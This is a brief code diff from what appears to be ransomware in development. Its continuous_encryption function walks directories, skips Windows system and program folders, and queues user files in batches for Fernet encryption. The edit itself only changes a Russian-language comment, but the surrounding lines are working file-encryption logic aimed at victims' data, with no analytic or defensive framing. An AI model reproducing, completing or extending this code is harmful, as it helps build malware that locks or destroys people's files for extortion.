@@ -274,7 +274,7 @@ def continuous_encryption(stop_flag, fernet, encrypted_count_list):
                     dirs[:] = [d for d in dirs if d not in ['Windows', 'Program Files', 'Program Files (x86)', 'AppData']]
                     for file in files:
                         files_to_encrypt.append((os.path.join(root, file), fernet))
-                        if len(files_to_encrypt) > 50: break # Бин: Не берем слишком много за раз
+                        if len(files_to_encrypt) > 50: break #Не берем слишком много за раз
                     if len(files_to_encrypt) > 50: break
             
             if files_to_encrypt:
